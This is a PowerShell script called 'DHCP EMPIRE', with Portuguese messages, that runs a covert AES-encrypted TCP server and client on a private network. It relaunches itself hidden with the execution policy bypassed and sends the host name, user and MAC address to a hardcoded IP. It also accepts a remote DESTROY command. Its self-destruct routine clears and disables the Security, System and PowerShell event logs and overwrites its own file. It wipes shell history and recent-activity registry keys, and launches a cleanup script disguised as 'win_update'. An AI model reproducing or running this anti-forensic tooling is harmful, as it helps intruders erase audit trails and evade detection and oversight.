$script:sp = "$env:davi.lucas\Desktop\DHCP_EMPIRE.ps1"
$sp=$script:sp
if ($MyInvocation.MyCommand.Path -ne $sp) {
    try {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $script:sp -Force
        Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$sp`"" -WindowStyle Hidden
        exit
    } catch {}
}

Remove-Variable * -ErrorAction SilentlyContinue
Clear-Host

$cfg = @{
    Porta = 54321
    Timeout = 60
    Destroy = 45
    Chave = "DhCpEmPiRe2024!CriptoAuto@@@2024!!"
    IPIni = "10.200.4.3"
    IPFim = "10.200.4.100"
    Mask = "255.255.255.0"
    GW = "10.200.4.1" 
    DNS1 = "10.250.0.57"
    DNS2 = "10.250.0.56"
}

class CryptoAuto {
    static [string] EncAuto([string]$txt) {
        try {
            $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($global:cfg.Chave.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $keyBytes
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.GenerateIV()

            $enc = $aes.CreateEncryptor()
            $txtBytes = [System.Text.Encoding]::UTF8.GetBytes($txt)
            $encBytes = $enc.TransformFinalBlock($txtBytes, 0, $txtBytes.Length)

            $result = $aes.IV + $encBytes
            $aes.Dispose()
            
            return [Convert]::ToBase64String($result)
        } catch { return $null }
    }

    static [string] DecAuto([string]$encTxt) {
        try {
            $allBytes = [Convert]::FromBase64String($encTxt)
            $iv = $allBytes[0..15]
            $encBytes = $allBytes[16..($allBytes.Length-1)]

            $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($global:cfg.Chave.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $keyBytes
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            $dec = $aes.CreateDecryptor()
            $decBytes = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
            $aes.Dispose()

            return [System.Text.Encoding]::UTF8.GetString($decBytes)
        } catch { return $null }
    }
}

function DestroyAuto {
    param($sp)
    Write-Host "[DESTROY] Iniciando destruição total..." -ForegroundColor Red
    
    try {
        Get-Process -Name "powershell" -ErrorAction SilentlyContinue | 
            Where-Object { $_.MainWindowTitle -like "*DHCP*" -or $_.MainWindowTitle -like "*EMPIRE*" } | 
            Stop-Process -Force
    } catch {}

    try {
        $logs = @(
            'Windows PowerShell',
            'Microsoft-Windows-PowerShell/Operational', 
            'System',
            'Application',
            'Security',
            'Setup'
        )
        
        foreach ($log in $logs) {
            try {
                wevtutil.exe cl $log 2>&1 | Out-Null
                wevtutil.exe sl $log /enabled:false 2>&1 | Out-Null
                wevtutil.exe sl $log /ms:16777216 2>&1 | Out-Null
            } catch { }
        }
        Write-Host "[DESTROY] Logs bagunçados" -ForegroundColor Green
    } catch {}

    if (Test-Path -Path $sp) {
        try {
            for ($i = 0; $i -lt 7; $i++) {
                $lixo = [byte[]]::new(4096)
                [System.Security.Cryptography.RNGCryptoServiceProvider]::new().GetBytes($lixo)
                try {
                    [System.IO.File]::WriteAllBytes($sp, $lixo)
                } catch {
                    try {
                        $fs = [System.IO.File]::Open($sp, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
                        $fs.Write($lixo, 0, $lixo.Length)
                        $fs.Close()
                    } catch {}
                }
                Start-Sleep -Milliseconds 100
            }
            
            Remove-Item $sp -Force -ErrorAction SilentlyContinue
            
            try {
                cmd /c "del /f /q /a `"$sp`""
            } catch {}
            
            Write-Host "[DESTROY] Arquivo principal destruído" -ForegroundColor Green
        } catch {
            Write-Host "[DESTROY] Erro ao destruir arquivo" -ForegroundColor Yellow
        }
    }

    try {
        Clear-History -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine\ConsoleHost_history" -Name * -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name * -Force -ErrorAction SilentlyContinue
        Write-Host "[DESTROY] Registros limpos" -ForegroundColor Green
    } catch {}

    try {
        $cleanCode = @"
try {
    `$logs = @('Windows PowerShell','Microsoft-Windows-PowerShell/Operational','System','Application')
    foreach (`$log in `$logs) {
        try { wevtutil.exe cl `$log 2>`$null } catch { }
        try { wevtutil.exe sl `$log /enabled:false 2>`$null } catch { }
    }
    Clear-History
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\PowerShell\PSReadLine\ConsoleHost_history' -Name * -Force -ErrorAction SilentlyContinue
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
} catch { }
Remove-Item `$MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
"@
        $cleanPath = [System.IO.Path]::Combine($env:TEMP, "win_update_$(Get-Random -Minimum 10000 -Maximum 99999).ps1")
        Set-Content -Path $cleanPath -Value $cleanCode -Force
        Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$cleanPath`"" -WindowStyle Hidden
        Write-Host "[DESTROY] Script limpeza executado" -ForegroundColor Green
    } catch {}

    $global:cfg = $null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Write-Host "[DESTROY] Destruição completa - Zero rastros" -ForegroundColor Green
    exit
}

function ServerAuto {
    Write-Host "`n=== SERVIDOR DHCP AUTOMÁTICO ===" -ForegroundColor Cyan
    Write-Host "[SERVER] Iniciando servidor automático..." -ForegroundColor Green
    Write-Host "[SERVER] Porta: $($cfg.Porta)" -ForegroundColor Yellow
    Write-Host "[SERVER] IPs: $($cfg.IPIni) - $($cfg.IPFim)" -ForegroundColor Yellow
    Write-Host "[SERVER] Auto-destruição em $($cfg.Destroy)s sem conexão" -ForegroundColor Red
    
    $ipPool = [System.Collections.ArrayList]@()
    $ipStart = [System.Net.IPAddress]::Parse($cfg.IPIni)
    $ipEnd = [System.Net.IPAddress]::Parse($cfg.IPFim)
    
    $startInt = [BitConverter]::ToUInt32($ipStart.GetAddressBytes()[3..0], 0)
    $endInt = [BitConverter]::ToUInt32($ipEnd.GetAddressBytes()[3..0], 0)
    
    for ($i = $startInt; $i -le $endInt; $i++) {
        $ipBytes = [BitConverter]::GetBytes($i)
        $ip = "$($ipBytes[3]).$($ipBytes[2]).$($ipBytes[1]).$($ipBytes[0])"
        $ipPool.Add($ip) | Out-Null
    }
    
    Write-Host "[SERVER] Pool criado: $($ipPool.Count) IPs" -ForegroundColor Green
    
    $clientes = @{}
    $ultimaConexao = Get-Date
    $listener = $null

    try {
        $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $cfg.Porta)
        $listener.Start()
        
        Write-Host "[SERVER] Aguardando clientes..." -ForegroundColor Yellow

        while ($true) {
            if ((Get-Date) - $ultimaConexao -gt (New-TimeSpan -Seconds $cfg.Destroy)) {
                Write-Host "[SERVER] Timeout - Auto-destruindo..." -ForegroundColor Red
                DestroyAuto -sp $script:sp
            }

            if ($listener.Pending()) {
                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                
                try {
                    $dadosEnc = $reader.ReadLine()
                    if ($dadosEnc) {
                        $dados = [CryptoAuto]::DecAuto($dadosEnc)
                        
                        if ($dados -and $dados.StartsWith("CONN|")) {
                            $parts = $dados.Split('|')
                            $pcName = $parts[1]
                            $user = $parts[2]
                            $mac = $parts[3]
                            
                            Write-Host "[SERVER] Cliente: $pcName ($user)" -ForegroundColor Green
                            
                            if ($ipPool.Count -gt 0) {
                                $ip = $ipPool[0]
                                $ipPool.RemoveAt(0)
                                
                                $clientes[$pcName] = @{
                                    IP = $ip
                                    Client = $client
                                    LastHB = (Get-Date)
                                }
                              
                                $config = @{
                                    IP = $ip
                                    Mask = $cfg.Mask
                                    GW = $cfg.GW
                                    DNS1 = $cfg.DNS1
                                    DNS2 = $cfg.DNS2
                                    Lease = 120
                                }
                                
                                $resp = "CONFIG|$(($config | ConvertTo-Json -Compress))"
                                $respEnc = [CryptoAuto]::EncAuto($resp)
                                
                                $writer = New-Object System.IO.StreamWriter($stream)
                                $writer.WriteLine($respEnc)
                                $writer.Flush()
                                
                                Write-Host "[SERVER] IP $ip -> $pcName" -ForegroundColor Cyan
                                Write-Host "[SERVER] IPs restantes: $($ipPool.Count)" -ForegroundColor Yellow
                            }
                            
                            $ultimaConexao = Get-Date
                        }
                        elseif ($dados -eq "HB") {
                            $ultimaConexao = Get-Date
                        }
                        elseif ($dados -eq "DESTROY") {
                            Write-Host "[SERVER] Recebido comando DESTROY" -ForegroundColor Red
                            DestroyAuto -sp $script:sp
                        }
                    }
                } catch {
                    Write-Host "[SERVER] Erro cliente" -ForegroundColor Red
                    try { $client.Close() } catch {}
                }
            }

            $clientes.Keys | ForEach-Object {
                $cliente = $clientes[$_]
                if ((Get-Date) - $cliente.LastHB -gt (New-TimeSpan -Seconds 30)) {
                    try {
                        $stream = $cliente.Client.GetStream()
                        $writer = New-Object System.IO.StreamWriter($stream)
                        $hbEnc = [CryptoAuto]::EncAuto("HB")
                        $writer.WriteLine($hbEnc)
                        $writer.Flush()
                        $cliente.LastHB = Get-Date
                    } catch {
                        Write-Host "[SERVER] Cliente $_ desconectado" -ForegroundColor Red
                        $ipPool.Add($cliente.IP) | Out-Null
                        $clientes.Remove($_)
                    }
                }
            }

            Start-Sleep -Seconds 5
        }
    }
    catch {
        Write-Host "[SERVER] Erro: $($_.Exception.Message)" -ForegroundColor Red
        DestroyAuto -sp $script:sp
    }
    finally {
        if ($listener) { $listener.Stop() }
    }
}

function ClientAuto {
    Write-Host "`n=== CLIENTE AUTOMÁTICO ===" -ForegroundColor Cyan
    Write-Host "[CLIENT] Conectando automaticamente..." -ForegroundColor Yellow
    Write-Host "[CLIENT] Auto-destruição em $($cfg.Timeout)s se não conectar" -ForegroundColor Red
    
    $svIP = "10.200.4.190"  # Altere para IP do seu servidor
    
    $conectado = $false
    $startTime = Get-Date

    while ((-not $conectado) -and ((Get-Date) - $startTime -lt (New-TimeSpan -Seconds $cfg.Timeout))) {
        try {
            Write-Host "[CLIENT] Tentando $svIP..." -ForegroundColor Yellow
            
            $client = New-Object System.Net.Sockets.TcpClient($svIP, $cfg.Porta)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            $pcName = $env:COMPUTERNAME
            $user = $env:USERNAME
            $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress

            $msg = "CONN|$pcName|$user|$mac"
            $msgEnc = [CryptoAuto]::EncAuto($msg)
            
            $writer.WriteLine($msgEnc)
            $writer.Flush()

            Write-Host "[CLIENT] Conectado! Aguardando IP..." -ForegroundColor Green

            $respEnc = $reader.ReadLine()
            if ($respEnc) {
                $resp = [CryptoAuto]::DecAuto($respEnc)
                if ($resp -and $resp.StartsWith("CONFIG|")) {
                    $config = $resp.Substring(7) | ConvertFrom-Json
                    Write-Host "[CLIENT] IP Recebido: $($config.IP)" -ForegroundColor Cyan
                    Write-Host "[CLIENT] Gateway: $($config.GW)" -ForegroundColor Cyan
                    Write-Host "[CLIENT] DNS: $($config.DNS1), $($config.DNS2)" -ForegroundColor Cyan
                    
                    $conectado = $true
                    $ultimoHB = Get-Date

                    while ($client.Connected) {
                        if ((Get-Date) - $ultimoHB -gt (New-TimeSpan -Seconds 10)) {
                            $hbEnc = [CryptoAuto]::EncAuto("HB")
                            $writer.WriteLine($hbEnc)
                            $writer.Flush()
                            $ultimoHB = Get-Date
                        }

                        if ((Get-Date) - $ultimoHB -gt (New-TimeSpan -Seconds $cfg.Destroy)) {
                            Write-Host "[CLIENT] Timeout conexão" -ForegroundColor Red
                            break
                        }

                        if ($stream.DataAvailable) {
                            $dadosEnc = $reader.ReadLine()
                            if ($dadosEnc) {
                                $dados = [CryptoAuto]::DecAuto($dadosEnc)
                                Write-Host "[CLIENT] Servidor: $dados" -ForegroundColor Green
                            }
                        }

                        Start-Sleep -Seconds 5
                    }
                }
            }
            $client.Close()
        }
        catch {
            Write-Host "[CLIENT] Falha: $($_.Exception.Message)" -ForegroundColor Red
            Start-Sleep -Seconds 5
        }
    }

    if (-not $conectado) {
        Write-Host "[CLIENT] Não conectado - Auto-destruindo" -ForegroundColor Red
        DestroyAuto -sp $script:sp
    } else {
        Write-Host "[CLIENT] Desconectado - Auto-destruindo" -ForegroundColor Yellow
        DestroyAuto -sp $script:sp
    }
}

function VerifyAuto {
    Write-Host "`n=== VERIFICAÇÃO AUTOMÁTICA ===" -ForegroundColor Magenta
    Write-Host "[VERIFY] Verificando remoção automática..." -ForegroundColor Yellow
    
    $ipAlvo = "10.200.5.47"  # Altere para IP do PC remoto

    Write-Host "[VERIFY] Testando $ipAlvo..." -ForegroundColor Cyan
   
    try {
        $client = New-Object System.Net.Sockets.TcpClient($ipAlvo, $cfg.Porta)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        
        $msg = "VERIFY|$(Get-Date -Format 'yyyyMMddHHmmss')"
        $msgEnc = [CryptoAuto]::EncAuto($msg)
        $writer.WriteLine($msgEnc)
        $writer.Flush()
        $client.Close()
        
        Write-Host "[VERIFY] SERVIDOR ATIVO no PC remoto!" -ForegroundColor Red
        
        Write-Host "[VERIFY] Enviando auto-destruição..." -ForegroundColor Yellow
        try {
            $client2 = New-Object System.Net.Sockets.TcpClient($ipAlvo, $cfg.Porta)
            $stream2 = $client2.GetStream()
            $writer2 = New-Object System.IO.StreamWriter($stream2)
            
            $destroyEnc = [CryptoAuto]::EncAuto("DESTROY")
            $writer2.WriteLine($destroyEnc)
            $writer2.Flush()
            $client2.Close()
            
            Write-Host "[VERIFY] Comando enviado" -ForegroundColor Green
        } catch {
            Write-Host "[VERIFY] Erro ao enviar comando" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[VERIFY] Servidor não encontrado - Provavelmente removido" -ForegroundColor Green
    }

    Write-Host "`n[VERIFY] Executando limpeza final..." -ForegroundColor Cyan
    DestroyAuto -sp $script:sp
}

Write-Host "`n" + "="*50 -ForegroundColor Cyan
Write-Host "           DHCP EMPIRE - SISTEMA AUTOMÁTICO" -ForegroundColor Yellow
Write-Host "="*50 -ForegroundColor Cyan
Write-Host " 1. SERVIDOR REMOTO (PC REMOTO)" -ForegroundColor White
Write-Host " 2. CLIENTE LOCAL (MEU PC)" -ForegroundColor White  
Write-Host " 3. VERIFICAR REMOÇÃO" -ForegroundColor White
Write-Host "="*50 -ForegroundColor Cyan

$op = Read-Host "`nSelecione o modo (1-3)"

switch ($op) {
    "1" { 
        Write-Host "`nIniciando MODO SERVIDOR..." -ForegroundColor Green
        Write-Host "Configuração: Automática" -ForegroundColor Yellow
        Write-Host "Criptografia: Automática" -ForegroundColor Yellow
        Write-Host "IPs: $($cfg.IPIni) - $($cfg.IPFim)" -ForegroundColor Yellow
        Start-Sleep -Seconds 2
        ServerAuto 
    }
    "2" { 
        Write-Host "`nIniciando MODO CLIENTE..." -ForegroundColor Green
        Write-Host "Conectando automaticamente..." -ForegroundColor Yellow
        Write-Host "Criptografia: Automática" -ForegroundColor Yellow
        Start-Sleep -Seconds 2
        ClientAuto 
    }
    "3" { 
        Write-Host "`nIniciando VERIFICAÇÃO..." -ForegroundColor Green
        Write-Host "Verificação automática..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2
        VerifyAuto 
    }
    default { 
        Write-Host "Opção inválida! Auto-destruindo..." -ForegroundColor Red
        DestroyAuto -sp $script:sp
    }
}
